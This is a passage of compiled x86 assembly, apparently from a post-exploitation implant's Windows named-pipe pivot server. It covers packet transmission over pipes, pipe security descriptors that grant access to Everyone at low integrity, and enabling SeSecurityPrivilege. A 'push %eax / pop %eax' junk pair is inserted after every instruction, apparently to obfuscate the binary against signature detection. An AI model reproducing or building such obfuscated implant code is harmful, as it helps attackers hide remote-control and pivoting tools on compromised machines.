	call	_pivot_tree_add
push %eax
pop %eax
	movl	$LC23, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	364(%eax), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_dbgprint_pivot_tree
push %eax
pop %eax
	movl	$LC24, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$34, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	call	_packet_create
push %eax
pop %eax
	movl	%eax, -68(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$312, %eax
push %eax
pop %eax
	movl	$16, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$262606, 4(%esp)
push %eax
pop %eax
	movl	-68(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_add_tlv_raw
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$296, %eax
push %eax
pop %eax
	movl	$16, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$262794, 4(%esp)
push %eax
pop %eax
	movl	-68(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_add_tlv_raw
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	364(%eax), %eax
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	-68(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_transmit
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
L21:
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
L20:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65928(%eax), %eax
push %eax
pop %eax
	leal	-4(%eax), %ecx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	leal	4(%eax), %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_xor_bytes
push %eax
pop %eax
L19:
	cmpl	$0, -28(%ebp)
push %eax
pop %eax
	je	L25
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65924(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65928(%eax), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC25, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	364(%eax), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	36(%eax), %eax
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	65928(%edx), %ebx
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	65916(%edx), %ecx
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	364(%edx), %edx
push %eax
pop %eax
	movl	%ebx, 8(%esp)
push %eax
pop %eax
	movl	%ecx, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
L25:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65924(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65928(%eax), %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -72(%ebp)
push %eax
pop %eax
	cmpl	$0, -72(%ebp)
push %eax
pop %eax
	je	L26
push %eax
pop %eax
	movl	-72(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC26, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65928(%eax), %eax
push %eax
pop %eax
	leal	(%edx,%eax), %ecx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %eax
push %eax
pop %eax
	movl	-72(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%ecx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memmove
push %eax
pop %eax
L26:
	movl	$LC27, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	-72(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 65924(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$0, 65928(%eax)
push %eax
pop %eax
L18:
	movl	$0, %eax
push %eax
pop %eax
	leal	-12(%ebp), %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%esi
push %eax
pop %eax
	popl	%edi
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC28:
	.ascii "[NP-SERVER] Writing a total of %u\0"
LC29:
	.ascii "[NP-SERVER] Wrote %u\0"
	.align 4
LC30:
	.ascii "[NP-SERVER] failed to do the write\0"
LC31:
	.ascii "%s. error=%d (0x%x)\0"
LC32:
	.ascii "[NP-SERVER] left to go: %u\0"
	.align 4
LC33:
	.ascii "[NP SERVER] server write. finished. dwResult=%d, written=%d\0"
	.text
	.def	_named_pipe_write_raw;	.scl	3;	.type	32;	.endef
_named_pipe_write_raw:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	65940(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_acquire
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC28, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L30
push %eax
pop %eax
L34:
	movl	$0, -24(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	leal	20(%eax), %ecx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	subl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	%ecx, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__WriteFile@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	leal	20(%eax), %ecx
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	$1, 12(%esp)
push %eax
pop %eax
	leal	-24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%ecx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetOverlappedResult@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L31
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC29, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	addl	%eax, -16(%ebp)
push %eax
pop %eax
	jmp	L36
push %eax
pop %eax
L31:
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC30, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L33
push %eax
pop %eax
L36:
	movl	16(%ebp), %eax
push %eax
pop %eax
	subl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC32, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L30:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	cmpl	16(%ebp), %eax
push %eax
pop %eax
	jb	L34
push %eax
pop %eax
L33:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC33, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	65940(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_release
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC34:
	.ascii "[NP-SERVER] AllocateAndInitializeSid failed: %u\0"
LC35:
	.ascii "[NP-SERVER] sidEveryone: %p\0"
	.align 4
LC36:
	.ascii "[NP-SERVER] SetEntriesInAclW failed: %u\0"
LC37:
	.ascii "[NP-SERVER] DACL: %p\0"
LC38:
	.ascii "[NP-SERVER] sidLow: %p\0"
	.align 4
LC39:
	.ascii "[NP-SERVER] InitializeAcl failed: %u\0"
	.align 4
LC40:
	.ascii "[NP-SERVER] AddMandatoryAce failed: %u\0"
	.align 4
LC41:
	.ascii "[NP-SERVER] InitializeSecurityDescriptor failed: %u\0"
	.align 4
LC42:
	.ascii "[NP-SERVER] SetSecurityDescriptorDacl failed: %u\0"
	.align 4
LC43:
	.ascii "[NP-SERVER] SetSecurityDescriptorSacl failed: %u\0"
	.text
	.globl	_create_pipe_security_attributes
	.def	_create_pipe_security_attributes;	.scl	2;	.type	32;	.endef
_create_pipe_security_attributes:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$136, %esp
push %eax
pop %eax
	movl	$0, -26(%ebp)
push %eax
pop %eax
	movw	$256, -22(%ebp)
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	leal	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 40(%esp)
push %eax
pop %eax
	movl	$0, 36(%esp)
push %eax
pop %eax
	movl	$0, 32(%esp)
push %eax
pop %eax
	movl	$0, 28(%esp)
push %eax
pop %eax
	movl	$0, 24(%esp)
push %eax
pop %eax
	movl	$0, 20(%esp)
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	leal	-26(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__AllocateAndInitializeSid@44, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$44, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L38
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC34, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L37
push %eax
pop %eax
L38:
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC35, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$0, %ecx
push %eax
pop %eax
	movl	$32, %eax
push %eax
pop %eax
	andl	$-4, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L40:
	movl	%ecx, -64(%ebp,%eax)
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	cmpl	%edx, %eax
push %eax
pop %eax
	jb	L40
push %eax
pop %eax
	movl	$2097151, -64(%ebp)
push %eax
pop %eax
	movl	$2, -60(%ebp)
push %eax
pop %eax
	movl	$0, -56(%ebp)
push %eax
pop %eax
	movl	$0, -44(%ebp)
push %eax
pop %eax
	movl	$5, -40(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	$0, -68(%ebp)
push %eax
pop %eax
	leal	-68(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	leal	-64(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$1, (%esp)
push %eax
pop %eax
	movl	__imp__SetEntriesInAclW@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L42
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC36, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L42:
	movl	-68(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC37, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$0, -74(%ebp)
push %eax
pop %eax
	movw	$4096, -70(%ebp)
push %eax
pop %eax
	movl	$0, -80(%ebp)
push %eax
pop %eax
	leal	-80(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 40(%esp)
push %eax
pop %eax
	movl	$0, 36(%esp)
push %eax
pop %eax
	movl	$0, 32(%esp)
push %eax
pop %eax
	movl	$0, 28(%esp)
push %eax
pop %eax
	movl	$0, 24(%esp)
push %eax
pop %eax
	movl	$0, 20(%esp)
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$4096, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	leal	-74(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__AllocateAndInitializeSid@44, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$44, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L43
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC34, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L43:
	movl	-68(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC38, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$256, 4(%esp)
push %eax
pop %eax
	movl	$64, (%esp)
push %eax
pop %eax
	movl	__imp__LocalAlloc@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	$4, 8(%esp)
push %eax
pop %eax
	movl	$256, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InitializeAcl@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L44
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC39, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L44:
	movl	-80(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$4, 8(%esp)
push %eax
pop %eax
	movl	$4, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_AddMandatoryAce@20
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L45
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC40, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L45:
	movl	$20, 4(%esp)
push %eax
pop %eax
	movl	$64, (%esp)
push %eax
pop %eax
	movl	__imp__LocalAlloc@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__InitializeSecurityDescriptor@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L46
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC41, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L46:
	movl	-68(%ebp), %eax
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__SetSecurityDescriptorDacl@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L47
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC42, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L47:
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__SetSecurityDescriptorSacl@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L48
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC43, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L48:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$12, (%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$0, 8(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	-20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%eax)
push %eax
pop %eax
L37:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC44:
	.ascii "[NP-PRIV] Couldn't open process token: %u (%x)\0"
	.align 4
LC45:
	.ascii "[NP-PRIV] Couldn't look up the value: %u (%x)\0"
	.align 4
LC46:
	.ascii "[NP-PRIV] Couldn't adjust the token privs: %u (%x)\0"
LC47:
	.ascii "enabled\0"
LC48:
	.ascii "disabled\0"
LC49:
	.ascii "\0"
LC50:
	.ascii "not \0"
	.align 4
LC51:
	.ascii "[NP-PRIV] the %S token was %senabled, and is now %s\0"
	.text
	.globl	_toggle_privilege
	.def	_toggle_privilege;	.scl	2;	.type	32;	.endef
_toggle_privilege:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$84, %esp
push %eax
pop %eax
	movl	__imp__GetCurrentProcess@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	$40, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__OpenProcessToken@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L50
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, %ebx
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%ebx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC44, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L60
push %eax
pop %eax
L50:
	leal	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__LookupPrivilegeValueW@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L52
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, %ebx
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%ebx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC45, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L60
push %eax
pop %eax
L52:
	movl	$1, -28(%ebp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	-48(%ebp), %edx
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	movl	%edx, -20(%ebp)
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L53
push %eax
pop %eax
	movl	$2, %eax
push %eax
pop %eax
	jmp	L54
push %eax
pop %eax
L53:
	movl	$0, %eax
push %eax
pop %eax
L54:
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leal	-56(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 20(%esp)
push %eax
pop %eax
	leal	-44(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 16(%esp)
push %eax
pop %eax
	movl	$16, 12(%esp)
push %eax
pop %eax
	leal	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__AdjustTokenPrivileges@24, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L55
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, %ebx
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%ebx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC46, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L60
push %eax
pop %eax
L55:
	movl	-32(%ebp), %eax
push %eax
pop %eax
	shrl	%eax
push %eax
pop %eax
	andl	$1, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L56
push %eax
pop %eax
	movl	$LC47, %edx
push %eax
pop %eax
	jmp	L57
push %eax
pop %eax
L56:
	movl	$LC48, %edx
push %eax
pop %eax
L57:
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L58
push %eax
pop %eax
	movl	$LC49, %eax
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L58:
	movl	$LC50, %eax
push %eax
pop %eax
L59:
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC51, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L60:
	movl	-4(%ebp), %ebx
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC52:
	.ascii "[NP-SERVER] Creating new server instance of %s\0"
LC53:
	.ascii "SeSecurityPrivilege\0"
	.align 4
LC54:
	.ascii "[NP-SERVER] Failed to create named pipe.\0"
	.align 4
LC55:
	.ascii "[NP-SERVER] Creating the handler event\0"
	.align 4
LC56:
	.ascii "[NP-SERVER] Failed to create connect event for read overlap.\0"
	.align 4
LC57:
	.ascii "[NP-SERVER] Inserting the named pipe schedule entry\0"
	.text
	.globl	_create_pipe_server_instance
	.def	_create_pipe_server_instance;	.scl	2;	.type	32;	.endef
_create_pipe_server_instance:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$72, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$40, %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC52, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	leal	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	$LC53, (%esp)
push %eax
pop %eax
	call	_toggle_privilege
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jne	L62
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
	leal	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
